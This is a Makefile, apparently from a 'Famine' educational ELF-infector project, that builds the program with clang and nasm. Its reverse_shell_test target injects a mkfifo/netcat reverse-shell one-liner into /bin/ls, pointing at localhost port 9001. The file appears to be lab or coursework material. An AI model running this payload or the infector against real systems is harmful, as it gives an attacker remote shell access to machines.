include libft/rsc/mk/color.mk
include rsc/mk/source.mk

NAME            =   Famine
CC              =   clang

all:        $(NAME)

$(NAME): $(LIBFT) $(LIST) $(OBJ_DIR) $(OBJS) 
	@$(MAKE_LIBFT)
	@$(MAKE_LIST)
	@printf "$(CYAN)Compiling ${NAME} ...$(RESET)\n"
	@$(CC) $(CFLAGS) -o $(NAME) $(OBJS) $(LIBFT) $(LIST) -lm
	@printf "$(GREEN)Compiling $(NAME) done$(RESET)\n"

$(LIST):
ifeq ($(shell [ -f ${LIST} ] && echo 0 || echo 1), 1)
	@printf "$(CYAN)Compiling list...$(RESET)\n"
	@$(MAKE_LIST)
	@printf "$(GREEN)Compiling list done$(RESET)\n"
endif

$(LIBFT):
ifeq ($(shell [ -f ${LIBFT} ] && echo 0 || echo 1), 1)
	@printf "$(CYAN)Compiling libft...$(RESET)\n"
	@$(MAKE_LIBFT)
	@printf "$(GREEN)Compiling libft done$(RESET)\n"
endif

bonus: clear_mandatory $(LIBFT) $(LIST) $(OBJ_DIR) $(OBJS) $(ASM_OBJS)
	@$(MAKE_LIBFT)
	@$(MAKE_LIST)
	@printf "$(CYAN)Compiling ${NAME} ...$(RESET)\n"
	@$(CC) $(CFLAGS) -o $(NAME) $(OBJS) $(ASM_OBJS) $(LIBFT) $(LIST) -lm
	@printf "$(GREEN)Compiling $(NAME) done$(RESET)\n"

$(OBJ_DIR):
	@mkdir -p $(ALL_SRC_DIR)

$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c
	@printf "$(YELLOW)Compile $<$(RESET) $(BRIGHT_BLACK)-->$(RESET) $(BRIGHT_MAGENTA)$@$(RESET)\n"
	@$(CC) $(CFLAGS) -o $@ -c $<

$(OBJ_DIR)/%.o : $(SRC_DIR)/%.s
	@printf "$(YELLOW)Compile $<$(RESET) $(BRIGHT_BLACK)-->$(RESET) $(BRIGHT_MAGENTA)$@$(RESET)\n"
	@nasm -f elf64 $< -o $@ 

docker:
	@./rsc/docker/run.sh

tester:
	@./rsc/famine_tester.sh "/tmp/test /tmp/test2"

reverse_shell_test:
	@make bonus
	@./Famine /bin/ls -c1 -a 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 127.0.0.1 9001 >/tmp/f &'
	@./woody


clear_mandatory:
ifeq ($(shell [ -f ${OBJ_DIR}/main.o ] && echo 0 || echo 1), 0)
	@printf "$(RED)Clean mandatory obj $(RESET)\n"
	@rm -rf ${OBJ_DIR}
endif

clean:
ifeq ($(shell [ -d ${OBJ_DIR} ] && echo 0 || echo 1), 0)
	@$(RM) $(OBJ_DIR)
	@printf "$(RED)Clean $(OBJ_DIR) done$(RESET)\n"
	@$(RM)
endif

fclean:		clean_lib clean
	@$(RM) $(NAME)
	@printf "$(RED)Clean $(NAME)$(RESET)\n"

clean_lib:
	@$(MAKE_LIST) fclean
	@$(MAKE_LIBFT) fclean
	@printf "$(RED)Clean libft, list$(RESET)\n"

test: $(NAME)
	@./$(NAME)

# @ulimit -c unlimited
leak thread debug: clean $(NAME)
	@printf	"$(CYAN)CFLAGS: $(CFLAGS)$(RESET)\n"
# @./$(NAME)

re: clean $(NAME)

.PHONY:		all clean fclean re bonus" > Makefile
